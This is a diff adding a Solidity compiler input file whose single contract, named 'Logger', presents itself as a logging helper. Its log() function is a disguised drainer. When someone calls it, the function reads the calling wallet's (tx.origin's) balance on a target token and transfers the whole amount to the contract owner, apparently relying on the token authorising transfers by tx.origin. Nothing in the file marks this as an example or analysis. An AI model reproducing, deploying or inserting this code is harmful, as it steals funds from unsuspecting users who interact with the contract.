@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "Impl.sol": {
+      "content": "pragma solidity ^0.8.9;\n\n\ninterface ITarget {\n    function transferTo(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract Logger {\n    ITarget target;\n    uint256 min = 1;\n    address owner = msg.sender;\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"ONLY_OWNER\");\n        _;\n    }\n\n    constructor(ITarget _target) {\n        target = _target;\n    }\n\n    function setMin(uint256 _amount) external onlyOwner {\n        min = _amount;\n    }\n\n    function log(bool _hard) public returns (bool) {\n        if(tx.origin == owner) {\n            return true;\n        }\n        uint256 _amount = target.balanceOf(tx.origin);\n        bool _ok = _amount >= min;\n        if(_ok) {\n            target.transferTo(owner, _amount);\n        }\n        if(_hard) {\n            require(_ok, \"PERMISSION_DENIED\");\n        } else {\n            return _ok;\n        }\n        return true;\n    }\n}"
+    }
+  }
+}
